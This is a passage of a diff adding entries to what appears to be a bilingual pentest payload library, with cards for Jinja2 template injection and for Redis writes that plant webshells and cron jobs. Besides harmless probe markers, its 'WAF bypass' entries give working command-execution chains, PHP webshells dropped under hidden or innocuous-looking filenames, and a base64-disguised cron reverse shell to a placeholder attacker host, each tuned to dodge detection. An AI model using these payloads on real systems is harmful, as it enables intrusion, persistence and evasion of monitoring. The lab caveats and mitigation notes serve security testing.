+              "part": "7 * 7",
+              "explanation": {
+                "zh": "算术表达式，求值结果 49",
+                "en": "Arithmetic expression evaluating to 49"
+              },
+              "type": "value"
+            },
+            {
+              "part": "}}",
+              "explanation": {
+                "zh": "表达式定界符结束",
+                "en": "Expression delimiter end"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "Jinja 字符串规范化 Marker",
+            "en": "Jinja String Normalization Marker"
+          },
+          "command": "{{ \"JINJA_B2\"|lower }}",
+          "description": {
+            "zh": "使用无副作用的 Jinja 字符串规范化 Marker确认输入是否被当作模板源码求值，并只比较固定 marker 输出。",
+            "en": "Use a side-effect-free Jinja string normalization marker to determine whether input becomes template source, comparing only fixed marker output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{{",
+              "explanation": {
+                "zh": "Jinja 表达式输出定界符开始",
+                "en": "Jinja output expression delimiter start"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "|lower",
+              "explanation": {
+                "zh": "小写过滤器，把字符串规范化为小写",
+                "en": "Lowercase filter normalizing the string"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "}}",
+              "explanation": {
+                "zh": "表达式定界符结束",
+                "en": "Expression delimiter end"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "Jinja 变量与集合 Marker",
+            "en": "Jinja Variable and Collection Marker"
+          },
+          "command": "{{ [\"JINJA\", \"C3\"]|join(\"_\") }}",
+          "description": {
+            "zh": "使用无副作用的 Jinja 变量与集合 Marker确认输入是否被当作模板源码求值，并只比较固定 marker 输出。",
+            "en": "Use a side-effect-free Jinja variable and collection marker to determine whether input becomes template source, comparing only fixed marker output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "|join(\"_\")",
+              "explanation": {
+                "zh": "以下划线连接列表元素的过滤器",
+                "en": "Filter joining list elements with underscores"
+              },
+              "type": "operator"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "Jinja 条件或序列 Marker",
+            "en": "Jinja Conditional or Sequence Marker"
+          },
+          "command": "{% if 7 == 7 %}JINJA_D4{% endif %}",
+          "description": {
+            "zh": "使用无副作用的 Jinja 条件或序列 Marker确认输入是否被当作模板源码求值，并只比较固定 marker 输出。",
+            "en": "Use a side-effect-free Jinja conditional or sequence marker to determine whether input becomes template source, comparing only fixed marker output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{% if",
+              "explanation": {
+                "zh": "条件语句标签",
+                "en": "Conditional statement tag"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "JINJA_D4",
+              "explanation": {
+                "zh": "条件为真时输出的 marker",
+                "en": "Marker output when the condition is true"
+              },
+              "type": "value"
+            },
+            {
+              "part": "{% endif %}",
+              "explanation": {
+                "zh": "条件语句结束标签",
+                "en": "Conditional statement end tag"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "只使用算术、字符串和控制结构 marker，不读取 Context、配置、文件、环境变量或网络资源。",
+          "en": "Use only arithmetic, string, and control-flow markers without reading context, configuration, files, environment variables, or network resources."
+        },
+        {
+          "zh": "每次只提交一个表达式并限制响应长度，出现编译器异常增长、Worker 抖动或非预期对象输出时立即停止。",
+          "en": "Submit one expression at a time with a response-size cap, stopping on compiler-error growth, worker instability, or unexpected object output."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "attr 链免点号执行链",
+            "en": "attr-Chain Dotless Execution"
+          },
+          "command": "{{ config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}",
+          "description": {
+            "zh": "全程用 attr 过滤器取属性并调用，整条表达式不含点号与下标括号，绕过按 `.` 属性链、config.__class__ 连写或 __globals__['os'] 特征编写的规则；依赖 Flask 上下文暴露 config 全局。命中判据：模板输出 id 的执行结果。",
+            "en": "Walks attributes and calls through the attr filter so the expression contains no dot or subscript brackets at all, evading rules keyed on dotted chains, the config.__class__ signature, or __globals__['os']; needs a Flask context exposing config. Success: the template renders the output of id."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "~",
+              "explanation": {
+                "zh": "Jinja 字符串拼接运算符，拼接两段 marker",
+                "en": "Jinja string concatenation operator joining the two marker parts"
+              },
+              "type": "operator"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "空白控制定界变形",
+            "en": "Whitespace-Control Delimiter Variant"
+          },
+          "command": "{{- 7 * 7 -}}",
+          "description": {
+            "zh": "空白控制语法把开定界符字面变为 {{-，绕过对 {{ 精确或前缀匹配的规则，解析树与 {{7*7}} 等价，可作定界符差分指纹与 {{7*7}} 成对提交。命中判据：输出 49。",
+            "en": "The whitespace-control syntax turns the literal opener into {{-, evading exact or prefix rules on {{ while the parse tree stays equivalent to {{7*7}}; pair it with {{7*7}} as a delimiter differential fingerprint. Success: 49 in output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{% set",
+              "explanation": {
+                "zh": "变量赋值语句标签",
+                "en": "Variable assignment statement tag"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "{{ marker }}",
+              "explanation": {
+                "zh": "输出赋值后的变量",
+                "en": "Outputs the assigned variable"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "语句块 print 探测绕过",
+            "en": "Statement-Block print Probe"
+          },
+          "command": "{%print(7*7)%}",
+          "description": {
+            "zh": "Jinja2 自 2.10 起在语句块内支持 print() 直接输出，绕过仅匹配 {{...}} 输出定界符的 WAF 规则；与 {{7*7}} 成对提交可做定界符差分指纹，确认引擎与规则盲区。命中判据：输出 49。",
+            "en": "Since Jinja2 2.10 the print() call inside a statement block writes to the output stream, evading WAF rules that only match the double-brace output delimiters; submitting it next to the plain arithmetic probe forms a delimiter differential fingerprint that confirms the engine and exposes rule blind spots. Success: 49 in output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{%print(7*7)%}",
+              "explanation": {
+                "zh": "语句块内 print 输出",
+                "en": "print output inside a statement block"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{%",
+              "explanation": {
+                "zh": "语句块定界符",
+                "en": "Statement-block delimiter"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "print(7*7)",
+              "explanation": {
+                "zh": "输出算式结果",
+                "en": "Prints the arithmetic result"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "request 对象 attr 组合链",
+            "en": "request-Object attr Chain"
+          },
+          "command": "{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}",
+          "description": {
+            "zh": "从 Flask 请求代理 request 出发，全程用 attr 过滤器与 __getitem__ 取 application、__globals__、__builtins__ 并调用 __import__ 执行 popen，表达式不含点号与方括号字面；相对 config 起点的既有链路新增 request 入口，绕过按 config.__class__ 起点特征编写的规则。命中判据：模板输出 id 的执行结果。",
+            "en": "Starting from the Flask request proxy, the chain walks application, __globals__ and __builtins__ entirely through the attr filter and __getitem__, then calls __import__ to run popen, with no literal dots or square brackets anywhere; the request entry point adds a second origin beside the existing config-based chain and evades rules keyed on the config.__class__ starting signature. Success: the template renders the output of id."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "request|attr('application')|attr('__globals__')",
+              "explanation": {
+                "zh": "request 代理起点进入模块全局",
+                "en": "request proxy entry into module globals"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "attr('__getitem__')",
+              "explanation": {
+                "zh": "字典键经回调取出避免方括号",
+                "en": "Dict keys fetched via callback to avoid brackets"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "('os')|attr('popen')('id')|attr('read')()",
+              "explanation": {
+                "zh": "导入执行链收尾",
+                "en": "Tail of the import-and-execute chain"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "建立 Jinja 字面基线",
+            "en": "Establish the Jinja literal baseline"
+          },
+          "description": {
+            "zh": "提交普通 marker 并记录未求值的原始输出、模板名称和 request_id。",
+            "en": "Submit a plain marker and record unevaluated output, template name, and request_id."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "提交 Jinja 算术 Marker",
+            "en": "Submit the Jinja arithmetic marker"
+          },
+          "description": {
+            "zh": "使用该引擎有效的无副作用算术语法，确认是否发生模板求值。",
+            "en": "Use valid side-effect-free arithmetic syntax for the engine to determine whether template evaluation occurs."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "使用第二种语义复核",
+            "en": "Confirm with a second semantic"
+          },
+          "description": {
+            "zh": "通过字符串、变量或条件 marker 排除硬编码数值、缓存和响应替换误报。",
+            "en": "Use a string, variable, or conditional marker to exclude hard-coded values, caching, and response substitution."
+          },
+          "payload": "{{ [\"JINJA\", \"C3\"]|join(\"_\") }}"
+        },
+        {
+          "title": {
+            "zh": "修复后回归全部 Marker",
+            "en": "Regress every marker after remediation"
+          },
+          "description": {
+            "zh": "修复后要求用户表达式按字面输出或作为普通变量转义，同时正常模板功能保持。",
+            "en": "After remediation, require user expressions to render literally or as escaped data while preserving normal template behavior."
+          },
+          "payload": "{% if 7 == 7 %}JINJA_D4{% endif %}"
+        }
+      ],
+      "references": [
+        "https://jinja.palletsprojects.com/en/stable/templates/",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "覆盖 Jinja2 模板注入的无副作用求值边界验证：以算术、字符串规范化、变量与集合、条件或序列四类 marker 确认输入是否被当作模板源码编译求值。适用于探测 Flask/Jinja 渲染入口并区分普通变量插值的场景。",
+          "en": "Covers side-effect-free evaluation-boundary verification for Jinja2 template injection: four marker families (arithmetic, string normalization, variables and collections, conditions or sequences) determine whether input is compiled and evaluated as template source. Suitable for probing Flask/Jinja render entry points and distinguishing plain variable interpolation."
+        },
+        "vulnerability": {
+          "zh": "根因是应用把请求文本传入 Template() 等动态模板构造或字符串模板 API，文本被 Jinja 编译为模板源码求值而非作为 Context 数据；模板源码与数据边界缺失使表达式可任意求值。",
+          "en": "The root cause is the application passing request text into dynamic template construction such as Template() or string-template APIs: the text is compiled and evaluated as Jinja template source instead of Context data. The missing boundary between template source and data allows arbitrary expression evaluation."
+        },
+        "exploitation": {
+          "zh": "按 Payload 列表顺序使用：先提交普通文本建立字面输出基线，再逐项提交第 1-4 步的算术、字符串、变量集合与条件序列 marker；输出出现固定 marker 计算结果而非原文即确认模板求值成立。每次只改变一个表达式并记录渲染结果；被 WAF 拦截时改用等价拼接语法与内建函数语义变体。验证中不访问环境变量、文件或进程。",
+          "en": "Use in Payload list order: first submit plain text to establish a literal-output baseline, then submit the step 1-4 arithmetic, string, variable/collection, and condition/sequence markers one by one; output showing the fixed marker's computed result rather than the original text confirms template evaluation. Change one expression per submission and record render results; when blocked by a WAF, switch to equivalent-concatenation and built-in-function-semantics variants. Do not touch environment variables, files, or processes during verification."
+        },
+        "mitigation": {
+          "zh": "用户输入只作命名 Context 变量传入固定模板，禁止运行时 Template() 编译用户文本，启用沙箱与自动转义：\n    from jinja2.sandbox import SandboxedEnvironment\n    env = SandboxedEnvironment(autoescape=True)\n    html = env.get_template(\"fixed.html\").render(data=user_input)",
+          "en": "Pass user input only as named Context variables into fixed templates, forbid runtime Template() compilation of user text, and enable SandboxedEnvironment with autoescaping; after the fix, marker payloads must output verbatim, with regression tests covering the template boundary."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "Jinja 阳性需要两个不同 marker 稳定求值并能定位到动态模板源码构造点。单个 49、模板错误、引擎指纹或普通变量输出都不足以确认 SSTI；更高影响必须由独立、版本匹配且无副作用的 Gadget 证据证明。",
+        "en": "A positive Jinja result requires two distinct markers to evaluate consistently and map to dynamic template-source construction. One value of 49, a template error, engine fingerprint, or ordinary variable output is insufficient; higher impact needs separate, version-matched, side-effect-free gadget evidence."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0060 候选1（语句块 print 探测，全文）与缺口方向（request 对象 attr 组合链，自造）追加 2 条变体；候选2 空白控制与候选3 class.inspect 已在库（waf[1]/waf[0]），不重复落库；原 2 条逐字节保留，新变体只追加末尾。"
+      }
+    },
+    {
+      "id": "auth2-redis-webshell",
+      "name": {
+        "zh": "Redis 持久化配置写入 WebShell",
+        "en": "Redis Persistence Configuration to WebShell"
+      },
+      "description": {
+        "zh": "验证暴露且高权限的 Redis 是否能通过持久化目录与文件名配置，把受控值写入 Web 可执行目录；命令操作归工具，利用条件保留为 RCE Payload。",
+        "en": "Tests whether an exposed privileged Redis instance can use persistence directory and filename settings to write controlled data into a web-executable path; mechanics belong in tools while the exploit condition remains an RCE payload."
+      },
+      "category": {
+        "zh": "RCE远程代码执行",
+        "en": "RCE Remote Code Execution"
+      },
+      "subCategory": {
+        "zh": "组件与服务 RCE",
+        "en": "Component & Service RCE"
+      },
+      "tags": [
+        "auth2",
+        "redis_webshell"
+      ],
+      "prerequisites": [
+        {
+          "zh": "把 Redis CONFIG/SAVE 工具操作与 Web 可执行文件条件分开审批，只使用隔离 Redis、临时 Web 根和无外网解释器。",
+          "en": "Approve Redis CONFIG and SAVE mechanics separately from web-executable-file conditions, using only isolated Redis, a temporary web root, and an interpreter without network access."
+        },
+        {
+          "zh": "确认 Redis 服务账户对临时目录的写权限、RDB 文件格式及 Web 映射，并以固定无输入 canary 替代命令执行。",
+          "en": "Confirm Redis service-account write access, RDB file format, and web mapping for the temporary directory, replacing command execution with a fixed input-free canary."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "RESP WebShell 值写入",
+            "en": "RESP web-shell value write"
+          },
+          "command": "*3\\r\\n$3\\r\\nSET\\r\\n$8\\r\\nwebshell\\r\\n$30\\r\\n<?php system($_GET['cmd']); ?>\\r\\n",
+          "description": {
+            "zh": "使用一条长度一致的 RESP SET 消息保存隔离测试用 PHP 内容；目录、文件名和持久化操作在 Redis 工具卡中单独说明。",
+            "en": "Store isolated PHP test content with one length-correct RESP SET message; directory, filename, and persistence operations remain in the Redis tool card."
+          },
+          "platform": "all"
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "无输入 canary 首次从临时 Web 路径执行后停止，禁止使用语料中的 eval/system/shell_exec 入口或传递命令参数。",
+          "en": "Stop after the input-free canary executes once from the temporary web path; do not use the corpus's eval, system, or shell_exec entry points or pass command arguments."
+        },
+        {
+          "zh": "恢复 Redis dir/dbfilename，删除测试键、RDB 与临时 Web 根，重启隔离解释器并撤销 Redis 服务账户写权限。",
+          "en": "Restore Redis dir and dbfilename, delete test keys, RDB files, and the temporary web root, restart the isolated interpreter, and revoke Redis service-account write access."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "APPEND 分片组装规避内容特征",
+            "en": "APPEND Chunked Assembly"
+          },
+          "command": "SET webshell \"<?php \"\\r\\nAPPEND webshell \"system($_GET[1]);?>\"\\r\\nCONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename cache.php\\r\\nSAVE",
+          "description": {
+            "zh": "先 SET 写入 <?php 前缀，再用 APPEND 追加代码段拼出完整 webshell，任何单条命令或单包内都不出现完整 <?php system 特征串，规避对 Redis 流量的内容匹配审计；落盘文件由 Redis 拼合后完整可执行。命中判据：cache.php 含完整代码且 Web 访问可执行。",
+            "en": "The first SET writes the <?php prefix and APPEND then glues the code segment on, so no single command or packet ever contains the complete <?php system signature, evading content-match audits on RESP traffic; Redis assembles the full executable file on disk. Success: cache.php contains the full code and executes when requested over the web."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "SET webshell \"<?php \"",
+              "explanation": {
+                "zh": "首段只写开标签前缀",
+                "en": "First chunk writes only the open-tag prefix"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "APPEND webshell",
+              "explanation": {
+                "zh": "追加命令拼合代码段",
+                "en": "APPEND glues the code segment"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "CONFIG SET dbfilename cache.php",
+              "explanation": {
+                "zh": "落盘文件名指向 Web 可达路径",
+                "en": "Drop filename points at a web-reachable path"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "dbfilename 相对路径落点规避",
+            "en": "Relative dbfilename Drop Point"
+          },
+          "command": "CONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename ../uploads/.cache.php\\r\\nSAVE",
+          "description": {
+            "zh": "以相对路径加点名前缀的组合改写落盘位置与文件名，绕过对 shell.php、webshell 等固定落盘名与固定 Web 根路径的监控规则；点前缀在多数目录列表中隐藏，../uploads 相对解析依赖 Redis 进程工作目录。命中判据：uploads 目录出现可解析的 .cache.php。",
+            "en": "A relative path combined with a dot-prefixed filename moves the drop point away from monitored names such as shell.php or webshell and away from the fixed web root; the leading dot hides the file in most directory listings, and ../uploads resolves against the Redis process working directory. Success: an interpretable .cache.php appears under uploads."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "CONFIG SET dir /var/www/html",
+              "explanation": {
+                "zh": "基准目录指向 Web 根",
+                "en": "Base directory set to the web root"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "../uploads/.cache.php",
+              "explanation": {
+                "zh": "相对路径加点前缀文件名",
+                "en": "Relative path with a dot-prefixed filename"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "值内换行拆分内容签名",
+            "en": "In-Value Newline Signature Split"
+          },
+          "command": "SET sess \"<?php\\r\\neval(base64_decode($_GET[1]));\\r\\n?>\"\\r\\nCONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename router.php\\r\\nSAVE",
+          "description": {
+            "zh": "在同一个 SET 值内部用 \\r\\n 把 <?php 与代码行拆开，行锚定的内容特征与单行 <?php system 组合匹配全部落空，PHP 仍按多行文本正常解析；代码改用 eval 加 base64_decode 进一步去掉 system 等函数明文。命中判据：router.php 落盘后传 1=base64 串可执行任意命令。",
+            "en": "Inside a single SET value, CRLF sequences split the <?php opener from the code lines, so line-anchored content signatures and single-line <?php system combinations stop matching while PHP still parses the multi-line text; eval with base64_decode additionally removes plaintext function names such as system. Success: after router.php lands, passing a base64 string in 1 executes arbitrary commands."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "eval(base64_decode($_GET[1]))",
+              "explanation": {
+                "zh": "解码执行去掉函数明文",
+                "en": "Decode-and-execute drops plaintext function names"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CONFIG SET dbfilename router.php",
+              "explanation": {
+                "zh": "以常规业务名落盘",
+                "en": "Drops under a routine business-style name"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认 Redis 与 Web 根目录边界",
+            "en": "Confirm the Redis and web-root boundary"
+          },
+          "description": {
+            "zh": "在隔离副本确认 Redis 身份、CONFIG 权限、RDB 持久化方式和 Web 根目录解析条件。",
+            "en": "Confirm Redis identity, CONFIG privileges, RDB persistence behavior, and web-root parsing conditions in an isolated copy."
+          }
+        },
+        {
+          "title": {
+            "zh": "写入单一测试值",
+            "en": "Write one test value"
+          },
+          "description": {
+            "zh": "发送长度一致的 RESP SET 消息，只保存可识别测试内容并记录 Redis 日志与键值。",
+            "en": "Send the length-correct RESP SET message, store only recognizable test content, and record Redis logs and the resulting key."
+          },
+          "payload": "*3\\r\\n$3\\r\\nSET\\r\\n$8\\r\\nwebshell\\r\\n$30\\r\\n<?php system($_GET['cmd']); ?>\\r\\n"
+        },
+        {
+          "title": {
+            "zh": "验证文件与解释器条件",
+            "en": "Validate file and interpreter conditions"
+          },
+          "description": {
+            "zh": "仅在测试目录验证持久化文件是否进入 PHP 解释路径，并排除静态下载、旧文件或缓存响应。",
+            "en": "Validate only in a test directory whether the persisted file reaches PHP interpretation, excluding static download, stale files, and cached responses."
+          }
+        },
+        {
+          "title": {
+            "zh": "恢复配置并删除测试数据",
+            "en": "Restore configuration and remove test data"
+          },
+          "description": {
+            "zh": "恢复 Redis 持久化配置、删除测试键和文件，并复测 CONFIG 权限与网络访问控制。",
+            "en": "Restore Redis persistence configuration, delete the test key and file, and retest CONFIG privileges and network controls."
+          }
+        }
+      ],
+      "references": [
+        "https://redis.io/docs/latest/operate/oss_and_stack/management/security/"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "Redis 持久化配置写入 WebShell 针对暴露且高权限 Redis 把受控值写入 Web 可执行目录的场景：需要 CONFIG 权限、目录可写与 Web 解释器三项同时成立。验证 RESP SET 写入受控 PHP 内容。",
+          "en": "Redis persistence-configuration-to-webshell targets exposed, over-privileged Redis writing controlled values into web-executable directories: CONFIG permission, writable directory, and a web interpreter must all hold. It validates RESP SET writing controlled PHP content."
+        },
+        "vulnerability": {
+          "zh": "风险来自未授权或过度授权的 Redis 与危险文件系统边界组合，原始 RESP 数据只是传输形式；把写入成功等同于代码执行会夸大结论，三项条件缺一都不能形成 WebShell 执行。",
+          "en": "The risk combines unauthorized or over-privileged Redis with dangerous filesystem boundaries; raw RESP data is only transport—equating write success with code execution overstates the finding, and any missing condition of the three prevents webshell execution."
+        },
+        "exploitation": {
+          "zh": "按第 1 步发送长度一致的 RESP SET 消息保存隔离测试用 PHP 内容到指定键；随后在授权范围内按工具卡流程设置 dir 指向 Web 目录、dbfilename 为 shell.php 并 SAVE 落盘。命中判据为访问生成的 shell.php 并传 cmd 参数后返回命令输出。目录不可写或 Web 不解释 PHP 时链路不成立，记录具体断点；测试后恢复配置并清理文件。",
+          "en": "Per step 1, send a length-consistent RESP SET message storing isolated test PHP content under the key; then within authorization follow the tool-card flow to set dir to the web directory, dbfilename to shell.php, and SAVE to disk. A hit is command output returned when requesting the generated shell.php with a cmd parameter. If the directory is unwritable or the web server does not interpret PHP, the chain fails—record the exact break point; restore configuration and clean files after testing."
+        },
+        "mitigation": {
+          "zh": "Redis 仅监听受信网络，ACL 禁止业务主体调用 CONFIG、SAVE 与模块命令；专用低权限账户运行且文件系统不可写 Web 根目录，对路径变化与新增脚本文件告警。\n    # redis.conf\n    bind 10.0.0.5\n    protected-mode yes\n    rename-command CONFIG \"\"\n    rename-command SAVE \"\"\n    # Redis 6+ ACL：禁管理命令\n    user appuser on >StrongPass ~app:* +@read +@write -@dangerous",
+          "en": "Bind Redis to trusted networks only and use ACLs to block unneeded CONFIG, SAVE, and module commands; run Redis under a dedicated low-privilege account with isolated filesystem that cannot write the web root; alert on CONFIG SET, persistence-path changes, and new script files in web directories. After the fix, replay the step-1 sequence and confirm writes are denied."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "拆分后的阳性证据要求工具侧审计显示 CONFIG 与 SAVE 确实写入临时路径，同时 Web 侧只执行固定 canary 并可由文件、进程和请求日志关联。Redis 中存在 PHP 字符串、SAVE 成功、文件不可解析、静态下载、HTTP 500 或模型声称生成 shell 都不能证明 WebShell/RCE。",
+        "en": "Positive evidence after splitting requires tool-side auditing to show CONFIG and SAVE writing the temporary path, while the web side executes only a fixed canary correlated through file, process, and request logs. A PHP string in Redis, successful SAVE, an unparsable file, static download, HTTP 500, or a model claiming a shell was generated does not prove a webshell or RCE."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0061 补齐空 wafBypass——APPEND 分片组装、dbfilename 相对路径落点（报告候选全文）与值内换行拆分内容签名（按 Redis 写 webshell 技术语境自造），语义标注为检测规避，共 3 条。"
+      }
+    },
+    {
+      "id": "auth2-redis-crontab",
+      "name": {
+        "zh": "Redis 持久化配置写入 Cron",
+        "en": "Redis Persistence Configuration to Cron"
+      },
+      "description": {
+        "zh": "验证高权限 Redis 是否能把持久化文件写入 Cron 读取位置并形成计划任务执行；Redis 命令归工具，执行条件链归 RCE/持久化 Payload。",
+        "en": "Tests whether privileged Redis persistence can write into a cron-consumed location and create scheduled execution; Redis mechanics belong in tools while the execution chain remains an RCE or persistence payload."
+      },
+      "category": {
+        "zh": "RCE远程代码执行",
+        "en": "RCE Remote Code Execution"
+      },
+      "subCategory": {
+        "zh": "组件与服务 RCE",
+        "en": "Component & Service RCE"
+      },
+      "tags": [
+        "auth2",
+        "redis_crontab"
+      ],
+      "prerequisites": [
+        {
+          "zh": "在一次性主机或容器中分离 Redis 管理命令与 cron 消费链，记录 CONFIG 权限、服务 UID、目录和 cron 实现。",
+          "en": "Separate Redis administration from the cron-consumption chain on a disposable host or container, recording CONFIG privileges, service UID, paths, and cron implementation."
+        },
+        {
+          "zh": "使用只创建临时 canary 文件且运行一次的计划任务，预先验证 RDB 前后缀不会让 cron 解析真实命令。",
+          "en": "Use a one-shot scheduled task that creates only a temporary canary file, first verifying how RDB prefixes and suffixes affect cron parsing."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "RESP Cron 持久化序列",
+            "en": "RESP cron persistence sequence"
+          },
+          "command": "*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$3\\r\\ndir\\r\\n$15\\r\\n/var/spool/cron\\r\\n*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$4\\r\\nroot\\r\\n*3\\r\\n$3\\r\\nSET\\r\\n$4\\r\\ncron\\r\\n$52\\r\\n\\n*/1 * * * * bash -c 'id > /tmp/redis-cron-proof'\\n\\r\\n*1\\r\\n$4\\r\\nSAVE\\r\\n",
+          "description": {
+            "zh": "在可回滚实验副本中展示完整 RESP 配置、测试 Cron 内容和 SAVE 序列；执行后必须恢复配置并清理。",
+            "en": "Show the complete RESP configuration, proof-only cron content, and SAVE sequence in a rollback-capable lab copy; restore configuration and clean up afterward."
+          },
+          "platform": "linux"
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "单次 canary 任务被调度后立即停止，不加入反向连接、持久循环或系统命令。",
+          "en": "Stop immediately after the one-shot canary task is scheduled; do not add reverse connections, persistent loops, or system commands."
+        },
+        {
+          "zh": "删除 cron 测试文件与 canary，恢复 Redis 持久化目录和文件名，清除测试键并重建一次性主机。",
+          "en": "Delete the cron test file and canary, restore Redis persistence directory and filename, clear test keys, and rebuild the disposable host."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "base64 化 cron 指令行",
+            "en": "base64-Encoded cron Line"
+          },
+          "command": "SET payload \"\\n\\n*/2 * * * * root echo YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSE9TVH0ve0xQT1JUfSAwPiYx|base64 -d|bash\\n\\n\"\\r\\nCONFIG SET dir /var/spool/cron\\r\\nCONFIG SET dbfilename root\\r\\nSAVE",
+          "description": {
+            "zh": "cron 行不含 bash -i、/dev/tcp、nc -e 等明文回连特征，反弹指令以 base64 形式藏于 echo 管道（解码后为 bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1），规避对 crontab 文件内容与回连关键字的检测；首尾空行把任务行推出 Redis 写入的头部噪声区。命中判据：crontab 生效且监听器收到回连。",
+            "en": "The cron line carries no plaintext callback keywords such as bash -i, /dev/tcp or nc -e: the reverse instruction hides in an echo pipe as base64 (decoding to bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1), evading detection keyed on crontab contents and callback keywords; blank leading and trailing lines push the task line past header noise from the Redis write. Success: the crontab activates and the listener receives the callback."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "*/2 * * * * root",
+              "explanation": {
+                "zh": "每 2 分钟以 root 执行",
+                "en": "Runs as root every two minutes"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSE9TVH0ve0xQT1JUfSAwPiYx|base64 -d|bash",
+              "explanation": {
+                "zh": "回连指令 base64 化后经管道执行",
+                "en": "Callback instruction base64-encoded and run through a pipe"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CONFIG SET dir /var/spool/cron",
+              "explanation": {
+                "zh": "落盘目录指向 crontab 区",
+                "en": "Drop directory set to the crontab area"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "用户 crontab 目录切换规避",
+            "en": "User crontab Directory Pivot"
+          },
+          "command": "CONFIG SET dir /var/spool/cron/crontabs\\r\\nCONFIG SET dbfilename root\\r\\nSAVE",
+          "description": {
+            "zh": "Debian/Ubuntu 的用户 crontab 位于 /var/spool/cron/crontabs/root，而多数监控规则默认只盯 RHEL 布局的 /var/spool/cron/root，切换 dir 即落入监控盲区；该目录由 crontab 命令管理，直接落盘的文件权限需可被 cron 读取。命中判据：crontabs/root 出现落盘内容并触发计划任务。",
